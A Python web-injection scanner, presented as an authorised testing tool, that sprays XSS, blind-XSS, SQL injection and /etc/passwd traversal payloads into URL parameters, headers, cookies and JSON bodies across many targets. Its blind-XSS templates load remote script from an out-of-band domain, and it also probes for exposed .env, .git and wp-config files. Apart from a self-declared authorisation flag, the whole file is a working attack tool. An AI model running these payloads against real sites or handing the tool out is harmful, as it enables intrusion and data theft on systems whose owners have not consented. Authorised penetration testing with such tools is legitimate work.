#!/usr/bin/env python3

# main.py
# Ultimate legal payload testing tool (Termux-friendly)
# Features: GET/POST/JSON, header/cookie injection, header template file, JSON auto-discovery probe,
# blind/OOB support, Playwright optional DOM verification, misconfig/outdated checks, Markdown POC report,
# robust error handling, colorized terminal output. Requires --confirm I_HAVE_AUTH.

from __future__ import annotations
import argparse
import csv
import html
import json
import logging
import os
import random
import re
import signal
import string
import sys
import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse, quote_plus

# third-party libs
try:
    import requests
except Exception:
    print("Install dependency: pip install requests")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except Exception:
    BS4_AVAILABLE = False

# Optional Playwright (desktop/VM)
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except Exception:
    PLAYWRIGHT_AVAILABLE = False

# ---------------- Banner & Colors ----------------
BANNER = r"""
__________   _____  _____.___..____     ________      _____   ________    
\______   \ /  _  \ \__  |   ||    |    \_____  \    /  _  \  \______ \   
 |     ___//  /_\  \ /   |   ||    |     /   |   \  /  /_\  \  |    |  \  
 |    |   /    |    \\____   ||    |___ /    |    \/    |    \ |    `   \ 
 |____|   \____|__  // ______||_______ \\_______  /\____|__  //_______  / 
                  \/ \/               \/        \/         \/         \/  
                                                                          
 _______                      .___.__                                     
 \      \    ____   ____    __| _/|  |    ____                            
 /   |   \ _/ __ \_/ __ \  / __ | |  |  _/ __ \                           
/    |    \\  ___/\  ___/ / /_/ | |  |__\  ___/                           
\____|__  / \___  >\___  >\____ | |____/ \___  >                          
        \/      \/     \/      \/            \/                           
      Made By : c4h-m in github .com
"""

CSI = "\033["
RESET = CSI + "0m"
COL = {
    "red": CSI + "31m", "green": CSI + "32m", "yellow": CSI + "33m",
    "blue": CSI + "34m", "magenta": CSI + "35m", "cyan": CSI + "36m",
    "white": CSI + "37m", "light_blue": CSI + "94m"
}

def color(text: str, colname: str) -> str:
    return COL.get(colname, "") + str(text) + RESET

def color_status(code: Optional[int]) -> str:
    if code is None: return color("ERR", "magenta")
    if 200 <= code < 300: return color(str(code), "light_blue")
    if 300 <= code < 400: return color(str(code), "cyan")
    if 400 <= code < 500: return color(str(code), "red")
    if 500 <= code < 600: return color(str(code), "magenta")
    return color(str(code), "white")

# ---------------- Logging ----------------
LOG_FILE = "xinjection_ultimate.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"), logging.StreamHandler(sys.stdout)]
)

# ---------------- Defaults & Globals ----------------
USER_AGENT_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16 Safari/605.1.15",
    "curl/7.79.1",
    "xinjection-ultimate/1.0"
]

COMMON_PARAMS = ["q", "s", "search", "id", "page", "term", "query", "text", "input", "name", "url"]
DEFAULT_THREADS = 10
DEFAULT_DELAY = 0.12
DEFAULT_JITTER = 0.25
DEFAULT_TIMEOUT = 10
MAX_RETRIES = 3
MAX_BACKOFF = 30.0

lock = threading.Lock()
SHUTDOWN = False

def handle_signals(sig, frame):
    global SHUTDOWN
    SHUTDOWN = True
    logging.warning("Shutdown signal received — finishing in-flight tasks...")
signal.signal(signal.SIGINT, handle_signals)
signal.signal(signal.SIGTERM, handle_signals)

# ---------------- Utilities ----------------
def rand_token(prefix="xinj", length=8) -> str:
    return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=length))}"

def atomic_write(path: str, data: str):
    tmp = f"{path}.tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            f.write(data)
        os.replace(tmp, path)
    except Exception:
        logging.exception("atomic_write fallback")
        with open(path, "w", encoding="utf-8") as f:
            f.write(data)

def load_lines(path: str) -> List[str]:
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

# ---------------- Payload templates & variants ----------------
def gen_templates(kind: str, count: int = 6, oob_domain: Optional[str] = None) -> List[str]:
    templates: List[str] = []
    if kind == "xss_harmless":
        templates = [
            "<script>console.log('{token}')</script>",
            "<img src=x onerror=\"console.log('{token}')\">",
            "<svg onload=\"console.log('{token}')\"></svg>"
        ]
        if oob_domain:
            templates.append(f"<img src='https://{oob_domain}/{{token}}.png'/>")
    elif kind == "xss_basic":
        templates = ["<script>alert('{token}')</script>", "<img src=x onerror=alert('{token}')>"]
    elif kind == "xss_blind":
        if not oob_domain:
            raise ValueError("xss_blind requires --oob-domain")
        templates = [
            f"<img src='https://{oob_domain}/x/{{token}}.png'/>",
            f"<script src='https://{oob_domain}/s/{{token}}.js'></script>",
            f"<iframe src='https://{oob_domain}/i/{{token}}'></iframe>"
        ]
    elif kind == "sqli_test":
        templates = ["' OR '1'='1' -- ", "' UNION SELECT NULL -- "]
    elif kind == "lfi_test":
        templates = ["../../etc/passwd", "/etc/passwd"]
    elif kind == "random_tokens":
        templates = ["{token}"]
    else:
        templates = ["{token}"]
    # expand to count
    while len(templates) < count:
        templates.append(templates[-1])
    # dedupe
    out, seen = [], set()
    for t in templates[:count]:
        if t not in seen:
            out.append(t); seen.add(t)
    return out

def build_variants(template: str, token: Optional[str] = None) -> List[Dict]:
    # returns list of {"type":..., "payload": ...}
    if token is None:
        token = rand_token()
    try:
        base = template.replace("{token}", token) if "{token}" in template else template + token
    except Exception:
        base = template + token
    variants = []
    try:
        variants = [
            {"type": "original", "payload": base},
            {"type": "url_encoded", "payload": quote_plus(base, safe='')},
            {"type": "double_url", "payload": quote_plus(quote_plus(base, safe=''), safe='')},
            {"type": "html_escaped", "payload": html.escape(base)},
            {"type": "js_escaped", "payload": base.replace("'", "\\'").replace('"', '\\"')},
            {"type": "json_escaped", "payload": base.replace("\n", "\\n").replace('"', '\\"')}
        ]
    except Exception:
        variants = [{"type": "original", "payload": base}]
    # dedupe
    seen, out = set(), []
    for v in variants:
        if v["payload"] not in seen:
            out.append(v); seen.add(v["payload"])
    return out

# ---------------- Parameter discovery & JSON probe ----------------
def quick_fetch(url: str, timeout: int = 6) -> Tuple[Optional[int], str, Dict]:
    try:
        r = requests.get(url, headers={"User-Agent": random.choice(USER_AGENT_POOL)}, timeout=timeout)
        return r.status_code, r.text or "", dict(r.headers)
    except Exception:
        return None, "", {}

def discover_params(url: str, timeout: int = 5) -> List[str]:
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    if not params and BS4_AVAILABLE:
        try:
            _, text, _ = quick_fetch(url, timeout=timeout)
            if text:
                soup = BeautifulSoup(text, "html.parser")
                for form in soup.find_all("form"):
                    for inp in form.find_all(["input", "textarea", "select"]):
                        n = inp.get("name")
                        if n and n not in params:
                            params.append(n)
        except Exception:
            pass
    if not params:
        params = COMMON_PARAMS.copy()
    # dedupe
    return [p for i,p in enumerate(params) if p and p not in params[:i]]

def json_discovery_probe(url: str, session: requests.Session, timeout: int = 6) -> bool:
    """
    Safe probe (opt-in): send a tiny JSON POST {"__xinj_probe": "ping"} to check if target accepts JSON.
    This should be run only when user explicitly enables --probe-json.
    """
    try:
        r = session.post(url, json={"__xinj_probe":"ping"}, timeout=timeout)
        ct = r.headers.get("Content-Type","")
        if r.status_code in (200,201) or "application/json" in ct:
            return True
    except Exception:
        pass
    return False

# ---------------- Robust request engine ----------------
def robust_request(session: requests.Session, method: str, url: str, headers: Dict = None, cookies: Dict = None,
                   data=None, json_body=None, timeout: int = DEFAULT_TIMEOUT) -> Dict:
    attempt = 0
    backoff = 1.0
    while attempt <= MAX_RETRIES and not SHUTDOWN:
        try:
            if method.upper() == "GET":
                r = session.get(url, headers=headers or {}, cookies=cookies or {}, timeout=timeout, allow_redirects=True)
            else:
                if json_body is not None:
                    r = session.post(url, headers=headers or {}, cookies=cookies or {}, json=json_body, timeout=timeout, allow_redirects=True)
                else:
                    r = session.post(url, headers=headers or {}, cookies=cookies or {}, data=data, timeout=timeout, allow_redirects=True)
            status = r.status_code
            text = r.text or ""
            if status in (429, 502, 503, 504):
                logging.debug(f"Transient {status} for {url} (attempt {attempt}) retrying...")
                attempt += 1
                time.sleep(backoff)
                backoff = min(MAX_BACKOFF, backoff * 2)
                continue
            return {"status": status, "text": text, "headers": dict(r.headers)}
        except requests.exceptions.Timeout:
            attempt += 1
            time.sleep(backoff)
            backoff = min(MAX_BACKOFF, backoff * 2)
            continue
        except requests.exceptions.RequestException as e:
            attempt += 1
            time.sleep(backoff)
            backoff = min(MAX_BACKOFF, backoff * 2)
            continue
        except Exception as e:
            logging.exception(f"Unexpected request error: {e}")
            return {"status": None, "text": "", "error": str(e)}
    return {"status": None, "text": "", "error": "max_retries_exceeded"}

# ---------------- Playwright JS/DOM check (optional desktop) ----------------
def playwright_check(url: str, tokens: List[str], timeout:int = 8) -> Dict:
    result = {"playwright": False, "console": [], "posts": [], "found_tokens": []}
    if not PLAYWRIGHT_AVAILABLE:
        result["error"] = "playwright_not_installed"
        return result
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()
            console_msgs = []
            posts = []
            page.on("console", lambda msg: console_msgs.append(f"{msg.type}: {msg.text}"))
            def on_request(req):
                try:
                    if req.method == "POST":
                        posts.append({"url": req.url, "post_data": req.post_data})
                except Exception:
                    pass
            page.on("request", on_request)
            page.goto(url, timeout=timeout*1000)
            time.sleep(1.0)
            browser.close()
            result.update({"playwright": True, "console": console_msgs, "posts": posts})
            for t in tokens:
                for c in console_msgs:
                    if t in c:
                        result["found_tokens"].append({"token": t, "via": "console", "msg": c})
                for p_ in posts:
                    if t in (p_.get("post_data") or "") or t in (p_.get("url") or ""):
                        result["found_tokens"].append({"token": t, "via": "post", "post": p_})
    except Exception as e:
        logging.exception(f"Playwright check failed: {e}")
        result["error"] = str(e)
    return result

# ---------------- Per-target pacer & dedupe ----------------
class Pacer:
    def __init__(self):
        self.lock = threading.Lock()
        self.last: Dict[str, float] = {}
        self.blocks: Dict[str, int] = {}
    def wait(self, host: str, min_interval: float):
        with self.lock:
            now = time.time(); last = self.last.get(host, 0.0)
            sleep_for = max(0.0, min_interval - (now - last))
        if sleep_for > 0:
            time.sleep(sleep_for)
    def mark(self, host: str):
        with self.lock:
            self.last[host] = time.time()
    def add_block(self, host: str):
        with self.lock:
            self.blocks[host] = self.blocks.get(host, 0) + 1
    def reset(self, host: str):
        with self.lock:
            self.blocks[host] = 0
    def blocks_count(self, host: str) -> int:
        with self.lock:
            return self.blocks.get(host, 0)

PACER = Pacer()

def print_brief(entry: Dict):
    st = color_status(entry.get("status"))
    prefix = color("[SUCCESS]", "green") if entry.get("success") else color("[.]", "yellow")
    reasons = ",".join(entry.get("reasons") or [])
    msg = f"{prefix} {st} {entry.get('injection_uri')}"
    if reasons:
        msg += f" | {reasons}"
    print(msg)

# ---------------- Header template parsing ----------------
def parse_header_templates(file_path: str) -> List[Tuple[str, str]]:
    """
    File format: one header per line, e.g.
    User-Agent: MyScanner/{token}
    X-Forwarded-For: {payload}
    """
    out = []
    try:
        lines = load_lines(file_path)
        for ln in lines:
            if ":" in ln:
                h, v = ln.split(":", 1)
                out.append((h.strip(), v.strip()))
    except Exception:
        logging.exception("Failed to parse header template file")
    return out

# ---------------- Misconfig & outdated scanner ----------------
def misconfig_scan(session: requests.Session, base_url: str, timeout: int = 8) -> Dict:
    res = {"url": base_url, "security_headers": {}, "sensitive": [], "old_indicators": [], "errors": []}
    try:
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        try:
            r = session.get(origin, timeout=timeout, headers={"User-Agent": random.choice(USER_AGENT_POOL)})
            sh = r.headers
            for h in ["Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy", "Strict-Transport-Security"]:
                res["security_headers"][h] = sh.get(h)
            server = (sh.get("Server") or "") + " " + (sh.get("X-Powered-By") or "")
            if re.search(r"Apache/2\.2|Apache/2\.0", server):
                res["old_indicators"].append("Apache 2.0/2.2 detected")
            if re.search(r"OpenSSL/1\.0", server):
                res["old_indicators"].append("OpenSSL 1.0 detected")
        except Exception as e:
            res["errors"].append(f"homepage check failed: {e}")
        sensitive = ["/robots.txt", "/.git/HEAD", "/.env", "/phpinfo.php", "/wp-config.php", "/backup.zip", "/config.php~"]
        for p in sensitive:
            if SHUTDOWN: break
            url = origin.rstrip("/") + p
            try:
                r = session.head(url, allow_redirects=True, timeout=timeout, headers={"User-Agent": random.choice(USER_AGENT_POOL)})
                if r.status_code == 200:
                    res["sensitive"].append({"path": p, "status": r.status_code})
                elif r.status_code and 300 <= r.status_code < 400:
                    res["sensitive"].append({"path": p, "status": r.status_code})
            except Exception:
                try:
                    r = session.get(url, timeout=timeout, headers={"User-Agent": random.choice(USER_AGENT_POOL)})
                    if r.status_code == 200:
                        res["sensitive"].append({"path": p, "status": r.status_code})
                except Exception:
                    pass
    except Exception as e:
        logging.exception(f"misconfig_scan error: {e}")
        res["errors"].append(str(e))
    return res

# ---------------- Worker (injection across vectors) ----------------
def worker_task(target: str,
                template: str,
                method: str,
                inject_headers: List[str],
                header_templates: List[Tuple[str,str]],
                inject_cookies: bool,
                json_body_flag: bool,
                param_override: Optional[str],
                session: requests.Session,
                min_interval: float,
                delay: float,
                jitter: float,
                timeout: int,
                playwright_flag: bool,
                probe_json: bool,
                checked: Set[Tuple[str,str,str]]) -> List[Dict]:
    out = []
    if SHUTDOWN:
        return out
    try:
        parsed = urlparse(target)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        params = discover_params(target)
        if param_override:
            params = [param_override] + [p for p in params if p != param_override]
        # optional JSON probe
        is_json_endpoint = False
        if probe_json:
            try:
                is_json_endpoint = json_discovery_probe(target, session, timeout=timeout)
            except Exception:
                is_json_endpoint = False
        # generate token and variants
        token = rand_token()
        variants = build_variants(template, token=token)
        cookie_name = f"xinj_{random.randint(1000,9999)}"
        # pacing
        PACER.wait(origin, min_interval)
        for p in params:
            if SHUTDOWN:
                break
            for v in variants:
                inj_key = (target, p, v["payload"])
                with lock:
                    if inj_key in checked:
                        continue
                    checked.add(inj_key)
                # build injection URI for logging (query)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[p] = [v["payload"]]
                inj_uri = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                # pacing/delay
                time.sleep(delay + random.random()*jitter)
                PACER.wait(origin, min_interval)
                PACER.mark(origin)
                # build headers
                headers = {"User-Agent": random.choice(USER_AGENT_POOL), "Referer": target}
                for hn in inject_headers:
                    if not hn: continue
                    headers[hn] = v["payload"]
                # header templates
                for (hn, hv_template) in header_templates:
                    try:
                        hv = hv_template.replace("{token}", token).replace("{payload}", v["payload"])
                        headers[hn] = hv
                    except Exception:
                        headers[hn] = hv_template
                # cookies
                cookies = {cookie_name: v["payload"]} if inject_cookies else {}
                # body
                data = None; json_body = None
                req_url = target
                if method.upper() == "GET":
                    req_url = inj_uri
                else:
                    req_url = urlunparse(parsed._replace(query=parsed.query))
                    if json_body_flag or is_json_endpoint:
                        # heuristic json field names
                        json_body = {"input": v["payload"], "q": v["payload"], "token": token}
                    else:
                        data = {p: v["payload"]}
                # perform request
                resp = robust_request(session, method, req_url, headers=headers, cookies=cookies, data=data, json_body=json_body, timeout=timeout)
                status = resp.get("status")
                text = resp.get("text", "")
                success = False
                reasons = []
                conf = 0
                # reflection detection
                if token in text or v["payload"] in text:
                    success = True; reasons.append("reflection_token"); conf += 70
                # server errors
                if status and status >= 500:
                    reasons.append("server_error"); conf += 5
                # OOB
                if "http://" in v["payload"] or "https://" in v["payload"]:
                    reasons.append("oob_reference")
                # Playwright verification if available
                pw_info = None
                if playwright_flag and PLAYWRIGHT_AVAILABLE and not success:
                    try:
                        pw_info = playwright_check(req_url, [token], timeout=timeout)
                        if pw_info.get("found_tokens"):
                            success = True; reasons.append("playwright_exec"); conf += 30
                    except Exception as e:
                        logging.debug(f"Playwright check error for {req_url}: {e}")
                        pw_info = {"error": str(e)}
                # adaptive backoff
                if status in (403, 429):
                    PACER.add_block(origin)
                    backoff = min(MAX_BACKOFF, 1 + PACER.blocks_count(origin)*2)
                    logging.warning(f"{origin} returned {status}; polite backoff {backoff}s")
                    time.sleep(backoff)
                else:
                    PACER.reset(origin)
                entry = {
                    "target": target,
                    "injected_param": p,
                    "method": method.upper(),
                    "injection_uri": inj_uri,
                    "payload_variant": v["type"],
                    "payload_preview": v["payload"][:500],
                    "status": status,
                    "success": success,
                    "confidence": conf,
                    "reasons": reasons,
                    "snippet": text[:500],
                    "oob_token": token if "oob_reference" in reasons or "oob" in template.lower() else None
                }
                if pw_info is not None:
                    entry["playwright"] = pw_info
                out.append(entry)
                print_brief(entry)
                if success:
                    break
            # if success for this param, break to next param
            if any(r["success"] for r in out if r.get("injected_param") == p):
                break
        return out
    except Exception as e:
        logging.exception(f"Worker exception for {target}: {e}")
        return [{"target": target, "error": str(e), "traceback": traceback.format_exc()}]

# ---------------- Orchestrator & Outputs & OOB registry & report ----------------
def orchestrate(targets: List[str],
                payload_templates: List[str],
                method: str,
                inject_headers: List[str],
                header_templates_file: Optional[str],
                inject_cookies: bool,
                json_body_flag: bool,
                param: Optional[str],
                threads: int,
                min_interval: float,
                delay: float,
                jitter: float,
                timeout: int,
                playwright_flag: bool,
                probe_json: bool,
                do_scan: bool,
                out_path: str,
                out_fmt: str,
                only_success: bool,
                generate_report: bool) -> Dict:
    session = requests.Session()
    session.headers.update({"User-Agent": random.choice(USER_AGENT_POOL)})
    checked: Set[Tuple[str,str,str]] = set()
    results: List[Dict] = []
    scans: Dict[str, Dict] = {}
    header_templates = parse_header_templates(header_templates_file) if header_templates_file else []
    oob_registry: List[Dict] = []
    with ThreadPoolExecutor(max_workers=threads) as exe:
        futures = []
        for t in targets:
            for templ in payload_templates:
                if SHUTDOWN: break
                futures.append(exe.submit(worker_task, t, templ, method, inject_headers, header_templates, inject_cookies,
                                          json_body_flag, param, session, min_interval, delay, jitter, timeout,
                                          playwright_flag, probe_json, checked))
            if do_scan:
                futures.append(exe.submit(misconfig_scan, session, t, timeout))
        for fut in as_completed(futures):
            if SHUTDOWN:
                logging.info("Shutdown requested during orchestrate; collecting available results.")
            try:
                res = fut.result()
                if isinstance(res, list):
                    for r in res:
                        if only_success and not r.get("success"):
                            continue
                        with lock:
                            results.append(r)
                        # track OOB tokens
                        if r.get("oob_token"):
                            oob_registry.append({
                                "target": r.get("target"),
                                "payload_preview": r.get("payload_preview"),
                                "token": r.get("oob_token"),
                                "injection_uri": r.get("injection_uri"),
                                "time": time.time()
                            })
                elif isinstance(res, dict):
                    scans[res.get("url", f"scan_{len(scans)+1}")] = res
            except Exception as e:
                logging.exception(f"Future error in orchestrate: {e}")
    # Save results bundle
    bundle = {"meta": {"generated_at": time.time(), "tool": "xinjection_ultimate"}, "results": results, "scans": scans, "oob_registry": oob_registry}
    try:
        if out_fmt == "csv":
            # results -> CSV, scans -> JSON sidefile, oob -> JSON sidefile
            res_file = out_path
            scan_file = out_path + ".scans.json"
            oob_file = out_path + ".oob.json"
            if results:
                keys = sorted(set().union(*(r.keys() for r in results)))
                with open(res_file, "w", newline="", encoding="utf-8") as f:
                    w = csv.DictWriter(f, fieldnames=keys); w.writeheader()
                    for r in results:
                        row = {k: (json.dumps(v, ensure_ascii=False) if isinstance(v, (list, dict)) else v) for k,v in r.items()}
                        w.writerow(row)
            else:
                open(res_file, "w").close()
            atomic_write(scan_file, json.dumps(scans, indent=2, ensure_ascii=False))
            atomic_write(oob_file, json.dumps(oob_registry, indent=2, ensure_ascii=False))
        else:
            atomic_write(out_path, json.dumps(bundle, indent=2, ensure_ascii=False))
    except Exception:
        logging.exception("Failed to save results bundle")
    # Generate Markdown POC reports if requested
    if generate_report and results:
        try:
            report_md = generate_markdown_report(bundle)
            rpt_path = out_path + ".report.md"
            atomic_write(rpt_path, report_md)
            logging.info("Markdown report written to %s", rpt_path)
        except Exception:
            logging.exception("Failed to generate markdown report")
    return bundle

# ---------------- Markdown POC generator ----------------
def generate_markdown_report(bundle: Dict) -> str:
    lines = ["# xinjection_ultimate Report", "", f"Generated: {time.ctime(bundle.get('meta',{}).get('generated_at', time.time()))}", ""]
    results = bundle.get("results", [])
    for i, r in enumerate(results, start=1):
        if not r.get("success"):
            continue
        lines.append(f"## Finding {i}")
        lines.append(f"- **Target:** {r.get('target')}")
        lines.append(f"- **Injection URL:** `{r.get('injection_uri')}`")
        lines.append(f"- **Method:** {r.get('method')}")
        lines.append(f"- **Param:** {r.get('injected_param')}")
        lines.append(f"- **Payload variant:** {r.get('payload_variant')}")
        lines.append(f"- **Status:** {r.get('status')}")
        lines.append(f"- **Reasons:** {', '.join(r.get('reasons') or [])}")
        lines.append("")
        lines.append("### Request reproduction")
        lines.append("```\n# Sample request - adjust for context\nGET " + r.get("injection_uri", "") + "\n```\n")
        lines.append("### Response snippet")
        snippet = r.get("snippet","").replace("```","")
        lines.append("```html\n" + snippet + "\n```")
        lines.append("")
        lines.append("### Remediation suggestions")
        lines.append("- Validate and encode user-supplied input according to context (HTML encode for HTML contexts, JSON encode for API contexts).")
        lines.append("- Add appropriate Content Security Policy and security headers where applicable.")
        lines.append("")
    return "\n".join(lines)

# ---------------- CLI ----------------
def parse_args():
    ap = argparse.ArgumentParser(prog="xinjection_ultimate.py",
                                description="xinjection_ultimate — ultimate legal payload testing tool. Use only on targets you are authorized to test.",
                                formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("-u","--url", help="Single target URL (include scheme).")
    ap.add_argument("-l","--list", help="File with target URLs (one per line).")
    ap.add_argument("-p","--payload", help="Single payload template (use {token} placeholder).")
    ap.add_argument("--payload-list", help="File with payload templates.")
    ap.add_argument("--generate", choices=["xss_harmless","xss_basic","xss_blind","sqli_test","lfi_test","random_tokens"], help="Generate payload templates.")
    ap.add_argument("--gen-count", type=int, default=6, help="Count for generated templates.")
    ap.add_argument("--oob-domain", help="Your OOB domain (required for xss_blind).")
    ap.add_argument("--method", choices=["GET","POST"], default="GET", help="HTTP method to use.")
    ap.add_argument("--json", action="store_true", dest="json_body", help="When POST, send JSON body (puts payload into typical JSON fields).")
    ap.add_argument("--inject-headers", help="Comma-separated header names to inject payload into (e.g. 'User-Agent,Referer').")
    ap.add_argument("--header-templates", help="File with header templates (Header: value with {payload} or {token}).")
    ap.add_argument("--inject-cookies", action="store_true", help="Inject payload into a cookie value.")
    ap.add_argument("--param", help="Specific parameter name to target (optional).")
    ap.add_argument("--threads", type=int, default=DEFAULT_THREADS)
    ap.add_argument("--min-interval", type=float, default=0.5, help="Min seconds between requests to same host.")
    ap.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Base delay between requests.")
    ap.add_argument("--jitter", type=float, default=DEFAULT_JITTER, help="Random jitter to add to delay.")
    ap.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    ap.add_argument("--probe-json", action="store_true", help="Safe JSON probe (opt-in) to detect JSON endpoints.")
    ap.add_argument("--scan", action="store_true", help="Run misconfig & outdated checks (lightweight).")
    ap.add_argument("--playwright", action="store_true", help="Enable Playwright JS/DOM verification (desktop only).")
    ap.add_argument("--only-success", action="store_true", help="Save only successful entries.")
    ap.add_argument("--output", default="xinjection_ultimate_results.json", help="Output file path.")
    ap.add_argument("--format", choices=["json","csv"], default="json", help="Output format.")
    ap.add_argument("--report", action="store_true", help="Generate Markdown POC report for successes.")
    ap.add_argument("--confirm", required=True, help="Type I_HAVE_AUTH to confirm authorization.")
    return ap.parse_args()

def main():
    print(BANNER)
    args = parse_args()
    if args.confirm != "I_HAVE_AUTH":
        print(color("[!] REFUSING: pass --confirm I_HAVE_AUTH to acknowledge authorization.", "red"))
        sys.exit(1)
    # targets
    targets: List[str] = []
    if args.url:
        targets.append(args.url.strip())
    if args.list:
        if not os.path.exists(args.list):
            logging.error("Targets file not found: %s", args.list); sys.exit(1)
        targets += load_lines(args.list)
    if not targets:
        logging.error("No targets provided (use -u or -l)."); sys.exit(1)
    # payloads
    payloads: List[str] = []
    if args.payload:
        payloads.append(args.payload)
    if args.payload_list:
        if not os.path.exists(args.payload_list):
            logging.error("Payload list file not found: %s", args.payload_list); sys.exit(1)
        payloads += load_lines(args.payload_list)
    if args.generate:
        try:
            payloads += gen_templates(args.generate, args.gen_count, args.oob_domain)
        except ValueError as ve:
            logging.error(str(ve)); sys.exit(1)
    # header injection list
    inject_headers = []
    if args.inject_headers:
        inject_headers = [h.strip() for h in args.inject_headers.split(",") if h.strip()]
    if args.playwright and not PLAYWRIGHT_AVAILABLE:
        logging.warning("Playwright not available in this environment; --playwright will be ignored.")
        args.playwright = False
    # header templates file validation
    if args.header_templates and not os.path.exists(args.header_templates):
        logging.error("Header templates file not found: %s", args.header_templates); sys.exit(1)
    # dedupe templates
    payloads = [p for i,p in enumerate(payloads) if p and p not in payloads[:i]]
    if not payloads:
        logging.error("No payloads specified. Use -p, --payload-list, or --generate."); sys.exit(1)
    logging.info("Starting run: targets=%d payloads=%d threads=%d method=%s", len(targets), len(payloads), args.threads, args.method)
    start = time.time()
    bundle = orchestrate(
        targets=targets,
        payload_templates=payloads,
        method=args.method,
        inject_headers=inject_headers,
        header_templates_file=args.header_templates,
        inject_cookies=args.inject_cookies,
        json_body_flag=args.json_body,
        param=args.param,
        threads=args.threads,
        min_interval=args.min_interval,
        delay=args.delay,
        jitter=args.jitter,
        timeout=args.timeout,
        playwright_flag=args.playwright,
        probe_json=args.probe_json,
        do_scan=args.scan,
        out_path=args.output,
        out_fmt=args.format,
        only_success=args.only_success,
        generate_report=args.report
    )
    elapsed = time.time() - start
    successes = sum(1 for r in bundle.get("results", []) if r.get("success"))
    logging.info("Run finished in %.1f s. Total results: %d, successes: %d", elapsed, len(bundle.get("results", [])), successes)
    print(color(f"\n[DONE] Results saved to {args.output} | successes: {successes}", "green"))
    if args.scan:
        print(color("\n[SCAN SUMMARY]", "cyan"))
        for url, s in bundle.get("scans", {}).items():
            print(color(f"- {url}", "yellow"))
            sec = s.get("security_headers", {})
            for h, val in sec.items():
                print(f"   {h}: {val}")
            if s.get("old_indicators"):
                print(color(f"   Old/version hints: {', '.join(s.get('old_indicators'))}", "red"))
            for fnd in s.get("sensitive", []):
                print(color(f"   Sensitive path: {fnd.get('path')} (status {fnd.get('status')})", "red"))
    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        logging.exception("Fatal error: %s", e)
        print(color(f"Fatal error occurred. Check {LOG_FILE}", "red"))
        sys.exit(1)
